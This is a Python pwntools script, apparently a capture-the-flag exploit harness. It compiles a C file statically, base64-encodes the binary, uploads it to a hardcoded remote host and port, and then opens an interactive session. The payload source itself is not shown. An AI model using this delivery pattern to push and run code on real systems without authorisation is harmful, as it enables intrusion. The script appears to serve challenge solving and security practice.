#!/usr/bin/env python3
from subprocess import check_output, CalledProcessError

# from pwn import args, remote, gdb, process, b64e
from pwn import *
import pwnlib

HOST, PORT = "47.242.149.197 7600".split()
exe = "./main.py"

def start(argv=[], *a, **kw) -> pwnlib.tubes.tube:
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''

def compile_binary(filename: str, flags: list) -> None:
    cmd = [
        # "/usr/bin/musl-gcc",
        "/usr/bin/gcc",
        filename,
        "-o",
        filename.replace(".c", ""),
        "-static",
        *flags
    ]
    try:
        output = check_output(cmd)
    except CalledProcessError as cpe:
        print(cpe)


filename = args.FILENAME if args.FILENAME else "main.c"
flags = args.FLAGS if args.FLAGS else ""
flags = flags.split()
if not args.NOCOMPILE:
    compile_binary(filename, flags)

with open(filename.replace(".c", ""), "rb") as file:
    data = b64e(file.read())

io = start()
io.readline()

io.sendline(data.encode())

io.interactive()
